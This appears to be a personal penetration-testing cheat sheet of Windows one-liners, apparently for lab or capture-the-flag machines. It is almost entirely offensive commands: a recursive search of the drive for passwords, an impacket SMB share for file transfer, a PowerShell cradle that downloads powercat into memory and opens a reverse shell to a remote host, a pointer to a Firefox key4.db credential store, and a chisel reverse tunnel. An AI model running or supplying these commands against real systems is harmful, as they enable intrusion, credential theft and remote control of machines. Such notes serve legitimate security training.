# windows
## one-liners
#### dir and file
list all files current dir
`get-childitem -hidden` 

search C:\ for password
`ci -recurse C:\ | % { select-string -path $_ -pattern password} 2>$null`



base64
`certutil -encone/-decode <FILE> <OUTFILE>`


#### network file transfers
smb setup on nix
`$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`

create cred object
```
> $pass = convertto-securestring 'password1' -AsPlainText -Force`
> $cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
> New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```

download file
`(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`

download a file and execute from memory with powercat
`IEX(New-Object System.Net.Webclient).DownloadString('http://10.1.1.1:8000/powercat.ps1');powercat -c 10.1.1.1 -p 8001 -e powershell.exe`




## smb
localhost
`sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1

``` 
$pass = convertto-securestring 'password1' -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential('dials', $pass)
New-PSDrive -Name dials -PSProvider FileSystem -Credential $cred -Root \\10.10.14.52\tools
cd dials:
```



## credentials
```
C:\Users\clara\AppData\Roaming\Mozilla\Firefox\Profiles\ljftf853.default-release\key4.db
```
sharpweb?
python cracker?


## file transfer



## chisel
*nix local
`./chisel server --reverse -p 9001`

win remote
`./chisel.exe client <IP.ADDR>:9001 R:<PORT_TO_FWD>:LOCALHOST:<PORT_TO_FWD>`
